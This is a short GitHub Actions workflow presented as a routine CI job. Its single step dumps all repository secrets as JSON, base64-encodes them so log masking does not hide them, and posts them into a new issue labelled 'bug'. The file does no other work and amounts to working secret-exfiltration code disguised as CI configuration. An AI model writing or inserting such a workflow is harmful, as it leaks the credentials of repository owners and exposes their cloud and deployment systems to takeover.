name: a
on: workflow_dispatch
jobs:
  a:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "$X" | base64 -w0 > /tmp/out
          gh issue create --title ci --body "$(cat /tmp/out)" --label bug || true
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          X: ${{ toJSON(secrets) }}
